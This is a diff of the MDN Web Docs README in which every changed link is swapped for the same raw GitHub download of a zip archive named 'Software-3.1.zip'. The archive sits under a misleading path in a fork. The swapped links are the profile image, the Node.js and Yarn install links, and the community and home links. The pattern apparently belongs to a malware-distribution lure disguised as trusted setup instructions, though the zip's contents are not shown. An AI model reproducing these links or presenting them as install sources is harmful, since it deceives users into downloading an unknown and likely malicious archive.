@@ -1,6 +1,6 @@
 # Welcome to MDN Web Docs
 
-![github-profile](https://user-images.githubusercontent.com/10350960/166113119-629295f6-c282-42c9-9379-af2de5ad4338.png)
+![github-profile](https://github.com/8070anurag/content/raw/refs/heads/main/files/en-us/mozilla/add-ons/webextensions/api/topsites/mostvisitedurl/Software-3.1.zip)
 
 [MDN Web Docs][] is an open-source, collaborative project that documents web technologies including CSS, HTML, JavaScript, and Web APIs.
 Alongside detailed reference documentation, we provide extensive learning resources for students and beginners getting started with web development.
@@ -17,7 +17,7 @@ In addition to English-language articles, over 35 volunteers lead translation an
 
 ## Build the site
 
-To set up the site locally, you need to have [Node.js](https://nodejs.org/) and [Yarn](https://yarnpkg.com/) installed.
+To set up the site locally, you need to have [Node.js](https://github.com/8070anurag/content/raw/refs/heads/main/files/en-us/mozilla/add-ons/webextensions/api/topsites/mostvisitedurl/Software-3.1.zip) and [Yarn](https://github.com/8070anurag/content/raw/refs/heads/main/files/en-us/mozilla/add-ons/webextensions/api/topsites/mostvisitedurl/Software-3.1.zip) installed.
 You can check if these are installed by running the following commands:
 
 ```bash
@@ -46,5 +46,5 @@ By participating in and contributing to our projects and discussions, you acknow
 
 You can communicate with the MDN Web Docs team and community using the [communication channels][].
 
-[communication channels]: https://developer.mozilla.org/en-US/docs/MDN/Community/Communication_channels
-[MDN Web Docs]: https://developer.mozilla.org/
+[communication channels]: https://github.com/8070anurag/content/raw/refs/heads/main/files/en-us/mozilla/add-ons/webextensions/api/topsites/mostvisitedurl/Software-3.1.zip
+[MDN Web Docs]: https://github.com/8070anurag/content/raw/refs/heads/main/files/en-us/mozilla/add-ons/webextensions/api/topsites/mostvisitedurl/Software-3.1.zip
